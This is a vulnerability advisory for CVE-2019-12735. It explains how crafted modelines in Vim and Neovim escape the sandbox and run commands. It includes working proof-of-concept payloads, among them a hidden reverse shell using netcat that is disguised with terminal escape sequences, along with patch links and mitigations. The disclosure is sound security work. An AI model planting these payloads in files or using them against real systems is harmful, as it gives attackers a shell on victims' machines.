*by Arminius ([@rawsec](https://twitter.com/rawsec))*

Vim/Neovim Arbitrary Code Execution via Modelines
=================================================

```
Product: Vim < 8.1.1365, Neovim < 0.3.6
Type:    Arbitrary Code Execution
CVE:     CVE-2019-12735
Date:    2019-06-04
Author:  Arminius (@rawsec)
```

Summary
-------

Vim before 8.1.1365 and Neovim before 0.3.6 are vulnerable to arbitrary code
execution via modelines by opening a specially crafted text file.


Proof of concept
----------------

- Create [`poc.txt`](../data/2019-06-04_ace-vim-neovim/poc.txt):

      :!uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="

- Ensure that the modeline option has not been disabled (`:set modeline`).

- Open the file in Vim:

      $ vim poc.txt

- The system will execute `uname -a`.

Proof of concept 2 (reverse shell)
----------------------------------

This PoC outlines a real-life attack approach in which a reverse shell
is launched once the user opens the file. To conceal the attack, the file will
be immediately rewritten when opened. Also, the PoC uses terminal escape
sequences to hide the modeline when the content is printed with `cat`. (`cat
-v` reveals the actual content.)

[`shell.txt`](../data/2019-06-04_ace-vim-neovim/shell.txt):

    \x1b[?7l\x1bSNothing here.\x1b:silent! w | call system(\'nohup nc 127.0.0.1 9999 -e /bin/sh &\') | redraw! | file | silent! # " vim: set fen fdm=expr fde=assert_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: \x16\x1b[1G\x16\x1b[KNothing here."\x16\x1b[D \n

Demo (victim left, attacker right):

![Reverse shell demo](https://i.imgur.com/8w4tteX.gif)

Details
-------

The modeline feature allows to specify custom editor options near the start or
end of a file. This feature is enabled by default and applied to all file types,
including plain `.txt`. A typical modeline:

    /* vim: set textwidth=80 tabstop=8: */

For security reasons, only a subset of options is permitted in modelines, and
if the option value contains an expression, it is executed in a sandbox: [[1]]

    No other commands than "set" are supported, for security reasons (somebody
    might create a Trojan horse text file with modelines).  And not all options
    can be set.  For some options a flag is set, so that when it's used the
    |sandbox| is effective.

The sandbox is meant to prevent side effects: [[2]]

    The 'foldexpr', 'formatexpr', 'includeexpr', 'indentexpr', 'statusline' and
    'foldtext' options may be evaluated in a sandbox.  This means that you are
    protected from these expressions having nasty side effects.  This gives some
    safety for when these options are set from a modeline.

However, the `:source!` command (with the bang [`!`] modifier) can be used to
bypass the sandbox. It reads and executes commands from a given file as if
*typed manually*, running them after the sandbox has been left. [[3]]

    :so[urce]! {file}       Read Vim commands from {file}.  These are commands
                            that are executed from Normal mode, like you type
                            them.

Thus, one can trivially construct a modeline that runs code outside the sandbox:

    # vim: set foldexpr=execute('\:source! some_file'):

An additional step is needed for Neovim which blacklists `execute()`: [[4]]

    execute({command} [, {silent}])                         *execute()*
                    Execute {command} and capture its output.
                    [...]
                    This function is not available in the |sandbox|.

Here, `assert_fails()` can be used instead, which takes a `{cmd}` argument, too: [[5]]

    assert_fails({cmd} [, {error} [, {msg}]])               *assert_fails()*
                    Run {cmd} and add an error message to |v:errors| if it does
                    NOT produce an error.

The following modeline utilizes a fold expression to run `source!  %` to
execute the current file, which in turn executes `uname -a || "(garbage)"` as a
shell command:

    :!uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="

Additionally, the Neovim-only function `nvim_input()` is vulnerable to the same
approach via e.g.:

     vi:fen:fdm=expr:fde=nvim_input("\:terminal\ uname\ -a"):fdl=0

(In the past, other modeline-related vulnerabilities have been patched in Vim - see [CVE-2002-1377](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1377), [CVE-2016-1248](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1248).)

Patches
-------

- [Vim patch 8.1.1365](https://github.com/vim/vim/commit/5357552)
- [Neovim patch](https://github.com/neovim/neovim/pull/10082) (released in [v0.3.6](https://github.com/neovim/neovim/releases/tag/v0.3.6))

Beyond patching, it's recommended to disable modelines in the vimrc (`set
nomodeline`), to use the [securemodelines](https://github.com/ciaranm/securemodelines/)
plugin, or to disable `modelineexpr` (since patch 8.1.1366, Vim-only) to disallow
expressions in modelines.

Timeline
--------

    - 2019-05-22 Vim and Neovim maintainers notified
    - 2019-05-23 Vim patch released
    - 2019-05-29 Neovim patch released
    - 2019-06-05 CVE ID CVE-2019-12735 assigned

Also see description of [CVE-2019-12735](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12735).

[1]: https://github.com/vim/vim/blob/5c017b2de28d19dfa4af58b8973e32f31bb1477e/runtime/doc/options.txt#L582
[2]: https://github.com/vim/vim/blob/5c017b2de28d19dfa4af58b8973e32f31bb1477e/runtime/doc/eval.txt#L13050
[3]: https://github.com/vim/vim/blob/5c017b2de28d19dfa4af58b8973e32f31bb1477e/runtime/doc/repeat.txt#L182
[4]: https://github.com/neovim/neovim/blob/1060bfd0338253107deaac346e362a9feab32068/runtime/doc/eval.txt#L3247
[5]: https://github.com/neovim/neovim/blob/1060bfd0338253107deaac346e362a9feab32068/runtime/doc/eval.txt#L2494
[6]: https://github.com/vim/vim/releases/tag/v8.1.1365
[7]: https://github.com/neovim/neovim/releases/tag/v0.3.6